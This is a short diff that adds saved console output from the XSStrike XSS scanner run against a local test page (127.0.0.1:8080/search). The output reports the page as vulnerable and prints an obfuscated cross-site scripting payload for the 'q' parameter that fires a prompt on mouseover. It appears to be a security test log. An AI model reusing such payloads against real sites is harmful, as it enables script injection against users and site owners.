@@ -1,0 +1,12 @@
+
+	XSStrike v3.1.5
+
+ Crawling the target 
+ Parsing                                         
+ 
+ Parsing search?q=a                              
+ 
+[++] Vulnerable webpage: http://127.0.0.1:8080/search 
+[++] Vector for q: <D3V/+/OnmoUSEOvER%0a=%0aa=prompt,a()%0dx>v3dm0s 
+ Progress: 3/3
+ 
